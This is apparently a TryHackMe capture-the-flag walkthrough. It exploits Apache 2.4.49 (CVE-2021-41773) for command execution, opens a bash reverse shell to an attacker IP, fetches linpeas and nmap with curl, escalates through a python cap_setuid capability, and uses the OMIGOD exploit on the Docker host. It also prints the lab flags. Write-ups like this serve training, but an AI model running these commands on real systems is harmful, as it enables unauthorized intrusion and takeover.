# IP
10.10.251.106

## Enumeration
### Nmap 
- Found 2 ports running on the system

```console
❯ nmap -sC -sV 10.10.251.106 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-21 19:21 IST
Nmap scan report for 10.10.251.106
Host is up (0.16s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Consult - Business Consultancy Agency Template | Home
|_http-server-header: Apache/2.4.49 (Unix)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.63 seconds
```

- Port `80/tcp` has `Apache/2.4.49`, which on googling found was vulnerable to [CVE:2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773).<br />

# Exploitation
## Apache 2.4.49 ([CVE:2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773))

- For exploiting the system I used a script from [exploitdb](https://www.exploit-db.com/exploits/50383).<br />
- On reversing the script, found that the system uses a file name with IP address of the target and command to execute as a parameter.
```console
❯ echo "10.10.251.106" > target.txt
❯ bash exploit.sh
Set [TAGET-LIST.TXT] [PATH] [COMMAND]
./PoC.sh targets.txt /etc/passwd
```
- On loading target IP to the file, executed the exploit with `whoami` command
```console
❯ bash exploit.sh target.txt /bin/sh "whoami"
10.10.251.106
daemon
```
- We can try to load a reverse shell script and get a reverse shell.
```console
❯ bash exploit.sh target.txt /bin/sh "bash -c 'bash -i >& /dev/tcp/10.8.0.150/8080 0>&1'"
10.10.251.106
```

- Caught a reverse shell
```console
$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [10.8.0.150] from (UNKNOWN) [10.10.251.106] 60736
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
daemon@4a70924bafa0:/bin$
```

## Docker 
- While looking at root folder found that there is a `.dockerenv` file present, which indicates we are in a docker container.
```console
daemon@4a70924bafa0:/$ ls -la
total 76
drwxr-xr-x   1 root root 4096 Feb 23  2022 .
drwxr-xr-x   1 root root 4096 Feb 23  2022 ..
-rwxr-xr-x   1 root root    0 Feb 23  2022 .dockerenv «------Docker folder
drwxr-xr-x   1 root root 4096 Oct  8  2021 bin
drwxr-xr-x   2 root root 4096 Jun 13  2021 boot
drwxr-xr-x   5 root root  340 Oct 21 13:49 dev
drwxr-xr-x   1 root root 4096 Feb 23  2022 etc
drwxr-xr-x   2 root root 4096 Jun 13  2021 home
drwxr-xr-x   1 root root 4096 Oct  8  2021 lib
drwxr-xr-x   2 root root 4096 Sep 27  2021 lib64
drwxr-xr-x   2 root root 4096 Sep 27  2021 media
drwxr-xr-x   2 root root 4096 Sep 27  2021 mnt
drwxr-xr-x   2 root root 4096 Sep 27  2021 opt
dr-xr-xr-x 170 root root    0 Oct 21 13:49 proc
drwx------   1 root root 4096 Oct  8  2021 root
drwxr-xr-x   3 root root 4096 Sep 27  2021 run
drwxr-xr-x   1 root root 4096 Oct  8  2021 sbin
drwxr-xr-x   2 root root 4096 Sep 27  2021 srv
dr-xr-xr-x  13 root root    0 Oct 21 13:49 sys
drwxrwxrwt   1 root root 4096 Feb 23  2022 tmp
drwxr-xr-x   1 root root 4096 Sep 27  2021 usr
drwxr-xr-x   1 root root 4096 Sep 27  2021 var
```
- On running `whoami` we the output is `daemon` which confirms that we are in a docker.
```console
daemon@4a70924bafa0:/$ whoami
daemon
```
- The IP address of the machine is also in the format `172.17.x.x`.
```console
daemon@4a70924bafa0:/$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255 «---------IP 
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 762  bytes 57540 (56.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 538  bytes 320428 (312.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
- So loaded a `linpeas.sh` file on the system and started the scan. <br />
```console
daemon@4a70924bafa0:/tmp$ curl http://10.8.0.150/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  131k  100  131k    0     0   152k      0 --:--:-- --:--:-- --:--:--  152k
daemon@4a70924bafa0:/tmp$ chmod +x linpeas.sh
daemon@4a70924bafa0:/tmp$ ./linpeas.sh
```
- In the script found `python3.7` as root capabilities
```console
[+] Capabilities
/usr/bin/python3.7 = cap_setuid+ep
```
- So upgraded to a shell with python 
```console
daemon@4a70924bafa0:/tmp$ /usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
root@4a70924bafa0:/tmp# whoami
root
```
- Got the user flag.
```console
root@4a70924bafa0:/home# find / -name "user.txt" 2>/dev/null
/root/user.txt
root@4a70924bafa0:/home# cat /root/user.txt
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
```
- There was nothing more interesting in the  `linpeas` output, so loaded `nmap` binary to the system for further enumeration.
```console
root@4a70924bafa0:/tmp# curl http://10.8.0.150/nmap -o nmap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 5805k  100 5805k    0     0  1064k      0  0:00:05  0:00:05 --:--:-- 1273k
root@4a70924bafa0:/tmp# chmod +x nmap
```
- For the purpose of scanning I chose the default gateway which is `172.17.0.1`
```console
root@4a70924bafa0:/tmp# ./nmap -p- 172.17.0.1 --min-rate=700 -vvv | tee nmap.log
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-10-22 05:50 UTC
Initiating ARP Ping Scan at 05:50
Scanning 172.17.0.1 [1 port]
Completed ARP Ping Scan at 05:50, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:50
Completed Parallel DNS resolution of 1 host. at 05:50, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 05:50
Scanning ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1) [65535 ports]
Discovered open port 80/tcp on 172.17.0.1
Discovered open port 22/tcp on 172.17.0.1
Increasing send delay for 172.17.0.1 from 0 to 5 due to 11 out of 32 dropped probes since last increase.
SYN Stealth Scan Timing: About 10.96% done; ETC: 05:54 (0:04:12 remaining)
Increasing send delay for 172.17.0.1 from 5 to 10 due to 11 out of 33 dropped probes since last increase.
SYN Stealth Scan Timing: About 21.63% done; ETC: 05:54 (0:03:41 remaining)
Increasing send delay for 172.17.0.1 from 10 to 20 due to 11 out of 33 dropped probes since last increase.
SYN Stealth Scan Timing: About 32.31% done; ETC: 05:54 (0:03:11 remaining)
Increasing send delay for 172.17.0.1 from 20 to 40 due to 11 out of 29 dropped probes since last increase.
SYN Stealth Scan Timing: About 42.98% done; ETC: 05:54 (0:02:41 remaining)
Increasing send delay for 172.17.0.1 from 40 to 80 due to 13 out of 42 dropped probes since last increase.
SYN Stealth Scan Timing: About 53.65% done; ETC: 05:54 (0:02:10 remaining)
Increasing send delay for 172.17.0.1 from 80 to 160 due to 11 out of 33 dropped probes since last increase.
SYN Stealth Scan Timing: About 64.33% done; ETC: 05:54 (0:01:40 remaining)
Increasing send delay for 172.17.0.1 from 160 to 320 due to 11 out of 32 dropped probes since last increase.
Discovered open port 5986/tcp on 172.17.0.1
SYN Stealth Scan Timing: About 75.00% done; ETC: 05:54 (0:01:10 remaining)
Increasing send delay for 172.17.0.1 from 320 to 640 due to 11 out of 29 dropped probes since last increase.
SYN Stealth Scan Timing: About 85.67% done; ETC: 05:54 (0:00:40 remaining)
Increasing send delay for 172.17.0.1 from 640 to 1000 due to 11 out of 33 dropped probes since last increase.
Completed SYN Stealth Scan at 05:54, 281.22s elapsed (65535 total ports)
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Host is up, received arp-response (0.000040s latency).
Scanned at 2022-10-22 05:50:10 UTC for 281s
Not shown: 65531 filtered ports
Reason: 65531 no-responses
PORT     STATE  SERVICE REASON
22/tcp   open   ssh     syn-ack ttl 64
80/tcp   open   http    syn-ack ttl 64
5985/tcp closed unknown reset ttl 64
5986/tcp open   unknown syn-ack ttl 64
MAC Address: 02:42:4F:F3:92:56 (Unknown)
Read data files from: /etc
Nmap done: 1 IP address (1 host up) scanned in 281.44 seconds
           Raw packets sent: 196823 (8.660MB) | Rcvd: 230 (9.396KB)
```

- Port `5985` and `5986` seems to be suspicious, so on googling ans search found [hackticks.xyz](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-omi) blog on OMI .
- Downloaded [this](https://github.com/horizon3ai/CVE-2021-38647/blob/main/omigod.py) exploit from github.  
- On running this script found that we have to specify two parameters `target` (gateway) and `command`.
```console
root@4a70924bafa0:/tmp# python3 omigod.py
usage: omigod.py [-h] -t TARGET [-c COMMAND]
omigod.py: error: the following arguments are required: -t/--target
```
- For testing purpose sent a `whoami` command. 
```console
root@4a70924bafa0:/tmp# python3 omigod.py -t 172.17.0.1 -c whoami
root
```
- Thank god we are root, otherwise I had to add my forward my proxy and upgrade my privileges.
- So I directly tried to find the root flag, and got it.
```console
root@4a70924bafa0:/tmp# python3 omigod.py -t 172.17.0.1 -c "find / -name 'root.txt' 2>/dev/null"
/root/root.txt
```
- Read the root flag and done :stuck_out_tongue_winking_eye: .
```console
root@4a70924bafa0:/tmp# python3 omigod.py -t 172.17.0.1 -c "cat /root/root.txt"
THM{7f147ef1f36da9ae29529890a1b6011f}
```
